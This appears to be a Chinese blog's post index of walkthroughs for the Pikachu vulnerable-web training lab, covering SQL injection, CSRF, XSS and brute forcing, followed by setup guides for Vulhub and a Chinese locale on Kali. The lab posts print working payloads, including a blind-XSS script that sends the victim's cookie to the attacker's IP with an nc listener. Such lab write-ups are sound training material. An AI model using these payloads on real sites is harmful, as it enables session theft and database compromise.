        <content type="html"><![CDATA[<h2 id="Sql-Inject-SQL注入-介绍"><a href="#Sql-Inject-SQL注入-介绍" class="headerlink" title="Sql Inject(SQL注入)介绍"></a>Sql Inject(SQL注入)介绍</h2><pre><code>在owasp发布的top10排行榜里，注入漏洞一直是危害排名第一的漏洞，其中注入漏洞里面首当其冲的就是数据库注入漏洞。**一个严重的SQL注入漏洞，可能会直接导致一家公司破产！SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传入到后台处理时，没有做严格的判断，导致其传入的“数据”拼接到SQL语句中后，被当作SQL语句的一部分执行。 从而导致数据库受损（被脱裤、被删除、甚至整个服务器权限沦陷）。在构建代码时，一般会从如下几个方面的策略来防止SQL注入漏洞：1.对传进SQL语句里面的变量进行过滤，不允许危险字符传入；2.使用参数化（Parameterized Query 或 Parameterized Statement）；3.还有就是,目前有很多ORM框架会自动使用参数化解决注入问题,但其也提供了&quot;拼接&quot;的方式,所以使用时需要慎重! SQL注入在网络上非常热门，也有很多技术专家写过非常详细的关于SQL注入漏洞的文章，这里就不在多写了。  </code></pre><h2 id="数字型注入-post"><a href="#数字型注入-post" class="headerlink" title="数字型注入(post)"></a>数字型注入(post)</h2><p>第一关，选择查询的id然后点击查询就能查询到数据，这时候我对查询进行抓包。<br><img src="https://pic.888888.al/i/2023/08/15/yqjzhi.jpg" alt="1">  </p><p>右键 <em>Send to Repeater</em><br><img src="https://pic.888888.al/i/2023/08/15/yqmjdx.jpg" alt="2">  </p><p>我们在id这块进行测试，在后面添加 or 1&#x3D;1 发现有注入点:<br><img src="https://pic.888888.al/i/2023/08/15/yqzgyv.jpg" alt="3">  </p><h2 id="字符型注入-get"><a href="#字符型注入-get" class="headerlink" title="字符型注入(get)"></a>字符型注入(get)</h2><p>输入想查找的东西，点击查询进行查找,这边我们直接在输入框中进行测试,和上题一样输入 <strong>lili or 1&#x3D;1#</strong>,发现有注入点：<br><img src="https://pic.888888.al/i/2023/08/15/yrj41v.jpg" alt="4"></p><h2 id="xx型注入"><a href="#xx型注入" class="headerlink" title="xx型注入"></a>xx型注入</h2><p>和上题一样 ，输入**lili\**破坏其内部数据库语句结构<br><img src="https://pic.888888.al/i/2023/08/15/yrtyxr.jpg" alt="5"><br><img src="https://pic.888888.al/i/2023/08/15/ys4wlk.jpg" alt="6">  </p><h2 id="“insert-x2F-update”注入"><a href="#“insert-x2F-update”注入" class="headerlink" title="“insert&#x2F;update”注入"></a>“insert&#x2F;update”注入</h2><p>这边我们点击<strong>注册</strong>，在用户栏进行注入。payload为:<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/08/15/ys9px9.jpg" alt="7"><br><img src="https://pic.888888.al/i/2023/08/15/ysc421.jpg" alt="8">  </p><h2 id="“delete”注入"><a href="#“delete”注入" class="headerlink" title="“delete”注入"></a>“delete”注入</h2><p>这里是一个留言板，我们随便写一点东西进去，鼠标移到 <em>删除</em> 在左下角可以看到<strong>id&#x3D;60</strong>,说明我们的数据是有id头的，所以点击删除抓包。<br><img src="https://pic.888888.al/i/2023/08/15/yswjmj.jpg" alt="9"><br>我们在id&#x3D;60后面注入即可：<br><img src="https://pic.888888.al/i/2023/08/15/yszxxs.jpg" alt="10"><br><img src="https://pic.888888.al/i/2023/08/15/ytbjrq.jpg" alt="11">  </p><h2 id="“http-header”注入"><a href="#“http-header”注入" class="headerlink" title="“http header”注入"></a>“http header”注入</h2><p>有些时候，后台开发人员为了验证客户端头信息，比如常用的cookie验证，或者通过http请求头信息获取客户端的一些信息，比如useragent、accept字段等等，会对客户端的http请求头信息获取并使用sql进行处理，如果此时没有足够的安全考虑，则可能会导致基于http头的sql注入漏洞  </p><p>首先，我们点击 <em>点击退出</em> 抓包<br><img src="https://pic.888888.al/i/2023/08/15/ytx8da.jpg" alt="12">  </p><p>在<strong>User-Agent</strong>进行注入,payload为<strong>1’ and extractvalue(1,concat(0x7e,database())) and ‘</strong><br><img src="https://pic.888888.al/i/2023/08/15/yu0u9m.jpg" alt="13">  </p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>时间盲注主要使用if语句，通过延迟信息进行判断，不看回显信息，这里就不多说了，使用SQLMAP效果更佳，手动测试难免有误差。</p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之CSRF</title>
      <link href="/archives/f3a6c1ad.html"/>
      <url>/archives/f3a6c1ad.html</url>
      
        <content type="html"><![CDATA[<h2 id="CSRF-跨站请求伪造-攻击介绍"><a href="#CSRF-跨站请求伪造-攻击介绍" class="headerlink" title="CSRF(跨站请求伪造)攻击介绍"></a>CSRF(跨站请求伪造)攻击介绍</h2><pre><code>Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为&quot;one click&quot;攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。这里列举一个场景解释一下，希望能够帮助你理解。场景需求：小黑想要修改大白在购物网站tianxiewww.xx.com上填写的会员地址。先看下大白是如何修改自己的密码的：登录---修改会员信息，提交请求---修改成功。所以小黑想要修改大白的信息，他需要拥有：1，登录权限 2，修改个人信息的请求。但是大白又不会把自己xxx网站的账号密码告诉小黑，那小黑怎么办？于是他自己跑到www.xx.com上注册了一个自己的账号，然后修改了一下自己的个人信息（比如：E-mail地址），他发现修改的请求是：【http://www.xxx.com/edit.php?email=xiaohei@88.com&amp;Change=Change】于是，他实施了这样一个操作：把这个链接伪装一下，在小白登录xxx网站后，欺骗他进行点击，小白点击这个链接后，个人信息就被修改了,小黑就完成了攻击目的。为啥小黑的操作能够实现呢。有如下几个关键点：1.www.xxx.com这个网站在用户修改个人的信息时没有过多的校验，导致这个请求容易被伪造;---因此，我们判断一个网站是否存在CSRF漏洞，其实就是判断其对关键信息（比如密码等敏感信息）的操作(增删改)是否容易被伪造。2.小白点击了小黑发给的链接，并且这个时候小白刚好登录在购物网上;---如果小白安全意识高，不点击不明链接，则攻击不会成功，又或者即使小白点击了链接，但小白此时并没有登录购物网站，也不会成功。---因此，要成功实施一次CSRF攻击，需要“天时，地利，人和”的条件。当然，如果小黑事先在xxx网的首页如果发现了一个XSS漏洞，则小黑可能会这样做： 欺骗小白访问埋伏了XSS脚本（盗取cookie的脚本）的页面，小白中招，小黑拿到小白的cookie，然后小黑顺利登录到小白的后台，小黑自己修改小白的相关信息。---所以跟上面比一下，就可以看出CSRF与XSS的区别：CSRF是借用户的权限完成攻击，攻击者并没有拿到用户的权限，而XSS是直接盗取到了用户的权限，然后实施破坏。 因此，网站如果要防止CSRF攻击，则需要对敏感信息的操作实施对应的安全措施，防止这些操作出现被伪造的情况，从而导致CSRF。比如：--对敏感信息的操作增加安全的token；--对敏感信息的操作增加安全的验证码；--对敏感信息的操作实施安全的逻辑流程，比如修改密码时，需要先校验旧密码等。如果你没有读太明白,不要犹豫,请再读一遍啦  </code></pre><h2 id="CSRF-get"><a href="#CSRF-get" class="headerlink" title="CSRF(get)"></a>CSRF(get)</h2><p>通过以上的介绍，我们知道要想构成CSRF攻击，首先得诱导受害者点击我们的网页。我们先进入到其中一个用户的内部。<br><img src="https://pic.888888.al/i/2023/08/15/vowmxm.jpg" alt="1"><br>点击修改个人信息，修改手机号，点击提交并抓包。<br><img src="https://pic.888888.al/i/2023/08/15/vp0rov.jpg" alt="2"><br>将数据包中的<strong>GET</strong>和<strong>HOTS</strong>内容保存，并创建一个简单的html网页，代码如下:</p><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">HTML</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">title</span>&gt;</span> New Document <span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UIF-8&quot;</span> /&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;http://pikachu/vul/csrf/csrfget/csrf_get_edit.php?sex=&amp;phonenum=999&amp;add=&amp;email=&amp;submit=submit HTTP/1.1&quot;</span>&gt;</span>点我抽奖<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"> <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>效果如图:<br><img src="https://pic.888888.al/i/2023/08/15/vu9su0.jpg" alt="3"></p><p>当用户点击 <em>点我抽奖</em> 时会触发CSRF攻击,直接修改了用户的手机号。<br><img src="https://pic.888888.al/i/2023/08/15/vue9k0.jpg" alt="4">  </p><h2 id="CSRF-post"><a href="#CSRF-post" class="headerlink" title="CSRF(post)"></a>CSRF(post)</h2><p>如果是POST型的，所有参数在请求体中提交，我们不能通过伪造URL的方式进行攻击  </p><p>攻击者可以搭建一个站点，在站点上做一个表单，诱导vince点击这个链接，当用户点击时，就会自动向存在CSRF的服务器提交POST请求修改个人信息。</p><p>这里我们用Burp Suite自带的csrf功能构造一个站点:<br><img src="https://pic.888888.al/i/2023/08/15/vuu18s.jpg" alt="5"><br><img src="https://pic.888888.al/i/2023/08/15/vzsex7.jpg" alt="6"></p><p>同上面操作一样即可。  </p><h2 id="CSRF-token"><a href="#CSRF-token" class="headerlink" title="CSRF(token)"></a>CSRF(token)</h2><p><strong>CSRF的主要问题是敏感操作容易被伪造，我们可以加入Token让请求不容易被伪造，每次请求，都增加一个随机码（需要够随机，不容易被伪造），后台每次对这个随机码进行验证我们进入Pikachu平台的CSRF（token）页面并登录，我们可以看一下这个GET请求。</strong></p><p><strong>跟前面比较，这里多了一个Token，如果后台对提交的Token进行了验证，由于Token是随机的，我们就无法伪造URL了，对于token，暂时还没有什么办法通过</strong></p><p><strong>所以，使用token是一个很好的防御CSRF攻击的方法。</strong></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之XSS</title>
      <link href="/archives/77aee975.html"/>
      <url>/archives/77aee975.html</url>
      
        <content type="html"><![CDATA[<h2 id="跨站脚本攻击介绍"><a href="#跨站脚本攻击介绍" class="headerlink" title="跨站脚本攻击介绍"></a>跨站脚本攻击介绍</h2><p><strong>Cross-Site Scripting 简称为“CSS”，为避免与前端叠成样式表的缩写”CSS”冲突，故又称XSS。一般XSS可以分为如下几种常见类型:</strong>  </p><pre><code>    1.反射性XSS;    2.存储型XSS;    3.DOM型XSS;XSS漏洞一直被评估为web漏洞中危害较大的漏洞，在OWASP TOP10的排名中一直属于前三的江湖地位。XSS是一种发生在前端浏览器端的漏洞，所以其危害的对象也是前端用户。形成XSS漏洞的主要原因是程序对输入和输出没有做合适的处理，导致“精心构造”的字符输出在前端时被浏览器当作有效代码解析执行从而产生危害。因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理:  输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入;  输出转义：根据输出点的位置对输出到前端的内容进行适当转义;  </code></pre><h2 id="反射型XSS-get"><a href="#反射型XSS-get" class="headerlink" title="反射型XSS(get)"></a>反射型XSS(get)</h2><p>在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;&#x2F;script&gt;</strong> 即可：<br><img src="https://pic.888888.al/i/2023/08/15/w543ls.jpg" alt="1">  </p><h2 id="反射型XSS-post"><a href="#反射型XSS-post" class="headerlink" title="反射型XSS(post)"></a>反射型XSS(post)</h2><p>先登录进去,同样在输入框中输入 <strong>&lt;script&gt;alert(1)&lt;/script&gt;</strong> 即可<br><img src="https://pic.888888.al/i/2023/08/15/w9qe68.jpg" alt="2">  </p><h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><p>存储型XSS又称持久型XSS，攻击脚本将被永久地存放在目标服务器的数据库或文件中，具有很高的隐蔽性。  </p><p>同样在输入框中输入**&lt;script&gt;alert(1)&lt;&#x2F;script&gt;**，当有人浏览你的留言时都会触发XSS。<br><img src="https://pic.888888.al/i/2023/08/15/w6v9u2.jpg" alt="3">  </p><h2 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h2><p>查看页面的源代码，找到输入框的位置，可以看到输入的东西在前端进行了过滤，所以只要把前面语法闭合掉，然后添加自己的语法即可,<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/w6v9u2.jpg" alt="4"><br><img src="https://pic.888888.al/i/2023/08/15/wca2cs.jpg" alt="5">  </p><h2 id="DOM型XSS-X"><a href="#DOM型XSS-X" class="headerlink" title="DOM型XSS-X"></a>DOM型XSS-X</h2><p>同上一样的方法，审查一下js就好:<strong>‘&gt;&lt;img src&#x3D;”#” onmouseover&#x3D;”alert(‘xss’)”&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x3hn25.jpg" alt="6"><br><img src="https://pic.888888.al/i/2023/08/15/x3kut1.jpg" alt="7">  </p><h2 id="XSS之盲打"><a href="#XSS之盲打" class="headerlink" title="XSS之盲打"></a>XSS之盲打</h2><p><strong>盲打就是前端不会做出任何反馈，只有后台管理员知道，你写了什么，这时候我们就要利用nc反弹来获得管理员的cookie，进而可以登录到后台。</strong>  </p><p>我们用这个payload来打<strong>&lt;script&gt;var img&#x3D;document.createElement(“img”);img.src&#x3D;”http:&#x2F;&#x2F;[你的ip]:4444&#x2F;a?”+escape(document.cookie);&lt;&#x2F;script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x461q3.jpg" alt="8">  </p><p>提交完之后，我们用nc监听:</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -lvp 4444</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/x432fb.jpg" alt="9"><br><strong>当管理员进入后台，看到我们写的东西后，nc也就监听到了:</strong><br><img src="https://pic.888888.al/i/2023/08/15/x48n4m.jpg" alt="10">  </p><h2 id="XSS之过滤"><a href="#XSS之过滤" class="headerlink" title="XSS之过滤"></a>XSS之过滤</h2><p>前端对我们提交的语句进行了过滤，考虑大小写绕过 <strong>&lt;Script&gt;alert(1)&lt;&#x2F;Script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x4nemd.jpg" alt="11"></p><h2 id="XSS之htmlspecialchars"><a href="#XSS之htmlspecialchars" class="headerlink" title="XSS之htmlspecialchars"></a>XSS之htmlspecialchars</h2><p>我们使用 <strong>‘ onclick&#x3D;’alert(1)’</strong>  payload去打:<br><img src="https://pic.888888.al/i/2023/08/15/x6i03l.jpg" alt="12"></p><h2 id="XSS之href输出"><a href="#XSS之href输出" class="headerlink" title="XSS之href输出"></a>XSS之href输出</h2><p>通过分析得知直接使用js伪协议即可:<strong>javascript:alert(1)</strong><br><img src="https://pic.888888.al/i/2023/08/15/x6n2ms.jpg" alt="13"></p><h2 id="XSS之js输出"><a href="#XSS之js输出" class="headerlink" title="XSS之js输出"></a>XSS之js输出</h2><p>通过分析得知， 他将我们输入的字符存到了js代码里面然后进行判断，我们可以根据代码写一个闭合:<strong>‘&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;</strong><br><img src="https://pic.888888.al/i/2023/08/15/x705b8.jpg" alt="14"><br><img src="https://pic.888888.al/i/2023/08/15/x748s4.jpg" alt="15"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pikachu靶场通关秘籍之暴力破解</title>
      <link href="/archives/ec9ffc46.html"/>
      <url>/archives/ec9ffc46.html</url>
      
        <content type="html"><![CDATA[<h2 id="暴力破解介绍"><a href="#暴力破解介绍" class="headerlink" title="暴力破解介绍"></a>暴力破解介绍</h2><p><strong>这一关主要通过Burp Suite工具进行暴力破解，主要测试网站是否有弱口令漏洞。</strong></p><h2 id="基于表单的暴力破解"><a href="#基于表单的暴力破解" class="headerlink" title="基于表单的暴力破解"></a>基于表单的暴力破解</h2><p>很简单的一个登录窗口<br><img src="https://pic.888888.al/i/2023/08/15/xb52xw.jpg" alt="1"><br>我们先进一个抓包，再把数据报送到BP的 <em>intruder</em> 模块<br><img src="https://pic.888888.al/i/2023/08/15/xbe5ja.jpg" alt="2"><br>进入到 <em>intruder</em> 点击 <em>clear</em> 再把<strong>username</strong>和<strong>password</strong>选中，攻击方式选择 <em>Cluster bomb</em><br><img src="https://pic.888888.al/i/2023/08/15/xbu076.jpg" alt="3"><br>点击 <em>Payloads</em> 添加字典<br><img src="https://pic.888888.al/i/2023/08/15/xcgcey.jpg" alt="4"><br><img src="https://pic.888888.al/i/2023/08/15/xcjwy9.jpg" alt="5"><br>配置好后，点击右上角的 <em>Start attack</em>,等待攻击完成:<br><img src="https://pic.888888.al/i/2023/08/15/xd23ik.jpg" alt="6"><br>得到账号为<strong>admin</strong>，密码为<strong>123456</strong>  </p><p>尝试登录，登录成功。<br><img src="https://pic.888888.al/i/2023/08/15/xd6hvw.jpg" alt="7">  </p><h2 id="验证码绕过-on-server"><a href="#验证码绕过-on-server" class="headerlink" title="验证码绕过(on server)"></a>验证码绕过(on server)</h2><p><strong>这是一个带验证码的登录窗口，我要考虑的是爆破的时候，验证码会不会因为页面刷新而刷新。</strong> </p><p>和上一关一样，直接尝试暴力破解，发现验证码不会刷新，所以账号密码很容易就出来了。<br><img src="https://pic.888888.al/i/2023/08/15/xdi89e.jpg" alt="9"><br>尝试登陆，登录成功<br><img src="https://pic.888888.al/i/2023/08/15/xdssx4.jpg" alt="10">  </p><h2 id="验证码绕过-on-client"><a href="#验证码绕过-on-client" class="headerlink" title="验证码绕过(on client)"></a>验证码绕过(on client)</h2><p><strong>同样是一个有验证码的登录窗口，用上一关的方法发现不行，验证码一直在变</strong><br><img src="https://pic.888888.al/i/2023/08/15/xe7x4c.jpg" alt="11">  </p><p>这时候我们F12查看这个页面的js代码:<br><img src="https://pic.888888.al/i/2023/08/15/xe9xi5.jpg" alt="12"><br><strong>发现这验证码是前端验证，前端验证是可以让我们随意更改的，这里提供一种方法，就是直接把浏览器的js功能关了</strong><br><img src="https://pic.888888.al/i/2023/08/15/xeezs2.jpg" alt="13"><br>js功能关了后，直接就不需要验证码验证了，正常去爆破就好了。<br><img src="https://pic.888888.al/i/2023/08/15/xeq3oz.jpg" alt="14">  </p><h2 id="token防爆破"><a href="#token防爆破" class="headerlink" title="token防爆破?"></a>token防爆破?</h2><p><strong>最后一关，我们抓包发现其加了token防止我们暴力破解</strong><br><img src="https://pic.888888.al/i/2023/08/15/xetcxb.jpg" alt="15">  </p><p>同样，我们先右键 <em>send to intruder</em> 攻击方式选择 <em>Pitchfork</em> 选中<strong>password</strong>和<strong>token</strong>：<br><img src="https://pic.888888.al/i/2023/08/15/xexf24.jpg" alt="16">  </p><p>在payloads:1里面加入一些字典，然后点击 <em>Options</em>,_Number of threads改为1<br><img src="https://pic.888888.al/i/2023/08/15/xf0gl1.jpg" alt="17">  </p><p>往下翻，点击 _Grep-Extract_中的 <em>add</em>,找到**name&#x3D;’token’**选中value里面的数字，让他自动生成一个正则表达式:<br><img src="https://pic.888888.al/i/2023/08/15/xfbqny.jpg" alt="18"><br>点击ok后，继续往下翻，将 <em>Redirections</em> 中的 _Follow redirections_改为Always。<br><img src="https://pic.888888.al/i/2023/08/15/xffoir.jpg" alt="19">  </p><p>_Options_设置好后，到payloads:2里面，将 _Payload type_改为Recursive grep,在 <em>initial payload for first request</em> 中，将之前数据包中的token写到这里面:<br><img src="https://pic.888888.al/i/2023/08/15/xflghr.jpg" alt="20"><br><img src="https://pic.888888.al/i/2023/08/15/xfw039.jpg" alt="21">  </p><p>OK,可以开始暴力破解了:<br><img src="https://pic.888888.al/i/2023/08/15/xg01c7.jpg" alt="22"><br>得到想要得账号密码，去登录：<br><img src="https://pic.888888.al/i/2023/08/15/xg27sa.jpg" alt="23"></p>]]></content>
      
      
      <categories>
          
          <category> pikachu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pikachu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali搭建vulhub靶场</title>
      <link href="/archives/be82d226.html"/>
      <url>/archives/be82d226.html</url>
      
        <content type="html"><![CDATA[<h2 id="vulhub靶场介绍"><a href="#vulhub靶场介绍" class="headerlink" title="vulhub靶场介绍"></a>vulhub靶场介绍</h2><p>vulhub官网:<a href="https://vulhub.org/">https://vulhub.org/</a></p><p>Vulhub是一个基于docker和docker-compose的漏洞环境集合，进入对应目录并执行一条语句即可启动一个全新的漏洞环境，让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p><h2 id="搭建过程"><a href="#搭建过程" class="headerlink" title="搭建过程"></a>搭建过程</h2><h3 id="一、更新APT："><a href="#一、更新APT：" class="headerlink" title="一、更新APT："></a>一、更新APT：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get update </span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10yx55r.jpg" alt="1"></p><h3 id="二、安装https协议，CA证书"><a href="#二、安装https协议，CA证书" class="headerlink" title="二、安装https协议，CA证书"></a>二、安装https协议，CA证书</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install -y apt-transport-https ca-certificates</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10z06co.jpg" alt="2"></p><h3 id="三、安装docker"><a href="#三、安装docker" class="headerlink" title="三、安装docker"></a>三、安装docker</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zc1y8.jpg" alt="3"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> 查看版本        docker -v</span><br><span class="line">开启docker       systemctl start docker </span><br><span class="line">查看开启的环境    docker ps -a</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zf76f.jpg" alt="4"></p><h3 id="四、安装PIP3"><a href="#四、安装PIP3" class="headerlink" title="四、安装PIP3"></a>四、安装PIP3</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install python3-pip</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zhf29.jpg" alt="5"></p><h3 id="五、安装docker-compose"><a href="#五、安装docker-compose" class="headerlink" title="五、安装docker-compose"></a>五、安装docker-compose</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install docker-compose</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zk1r9.jpg" alt="6"></p><h3 id="六、下载vulhub"><a href="#六、下载vulhub" class="headerlink" title="六、下载vulhub"></a>六、下载vulhub</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/puier/vulhub.git</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/10zw3pd.jpg" alt="7"></p><h3 id="七、验证靶场搭建成功"><a href="#七、验证靶场搭建成功" class="headerlink" title="七、验证靶场搭建成功"></a>七、验证靶场搭建成功</h3><p>这里以activemq中的CVE-2015-5654漏洞为例<br>首先进入到CVE-2015-5654文件中去。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd vulhub/activemq/CVE-2015-5654</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/1100txk.jpg" alt="8"></p><p>接着：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">对靶场进行编译：docker-compose build</span><br><span class="line">运行靶场：docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/1103rmt.jpg" alt="9"></p><p>查看开放的端口：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker-compose ps</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/11065kz.jpg" alt="10"><br>发现其开放的端口为61616</p><p>在浏览器中访问:[IP]:61616，其中IP为你kali的ip地址<br><img src="https://pic.888888.al/i/2023/08/15/110hclw.jpg" alt="11"><br><strong>访问成功，即代表vulhub搭建成功</strong></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>之前想用centos搭建靶场，用物理机访问，但怎么也访问不了，在网上试了很多办法都没有成功，无奈选择kali。搭建过程也没有什么技巧，跟着步骤敲命令即可，如果下载失败，更改下载源就好了，网上也有教程，这里就不做赘述了。</p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kali汉化教程</title>
      <link href="/archives/4a17b156.html"/>
      <url>/archives/4a17b156.html</url>
      
        <content type="html"><![CDATA[<p>小伙伴有没有因为用不惯全英文kali而烦恼呢，这里教大家如何汉化kali。</p><h2 id="汉化教程"><a href="#汉化教程" class="headerlink" title="汉化教程"></a>汉化教程</h2><p>首先，此命令必须在root命令下进行，所以请先提权</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo su</span><br></pre></td></tr></table></figure><p>再输入以下命令:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><img src="https://pic.888888.al/i/2023/08/15/vkoya0.jpg" alt="1"><br><img src="https://pic.888888.al/i/2023/08/15/vm34lf.jpg" alt="2"></p><p>进入到此页面:<br><img src="https://pic.888888.al/i/2023/08/15/vlv5aj.jpg" alt="3"></p><p>选中其中的<strong>en_US.UTF-8 UTF-8 和 zh_CN.UTF-8 UTF-8</strong>（空格键为确定键，TAB键为返回）</p><p>设置完成后，重启：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure><p>最后：<br><img src="https://pic.888888.al/i/2023/08/15/vn0b79.jpg" alt="4"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p><strong>希望对大家有所帮助哦</strong></p>]]></content>
      
      
      <categories>
          
          <category> vulhub </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulhub </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
